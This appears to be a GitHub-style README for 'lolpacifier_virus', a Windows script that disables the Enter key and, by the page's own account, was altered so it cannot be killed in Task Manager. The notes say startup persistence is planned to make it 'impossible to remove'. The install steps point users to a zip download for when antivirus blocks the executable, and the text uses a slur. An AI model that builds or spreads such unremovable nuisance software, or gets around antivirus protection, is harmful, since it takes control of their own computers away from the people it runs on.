# lolpacifier_virus
The most overkill enter-disabling script in existence.
Release setup made with WinRar cause lazy.
Enjoy.

Edited by Zenith322 to make it a virus that cannot be deleted manually even in task manager. Have to system restart in order for program to stop running.


# Installation

METHOD 1:

Put the LolPacifier-Extract.exe file in a folder and run it, it will extract the files into a folder.

METHOD 2 (IF ANTIVIRUS RETARDED):

Download the portable.zip and extract it in a folder.


# Notes

Probably will update this so script runs when system starts up too - goal is to make it impossible to remove whatsoever :)
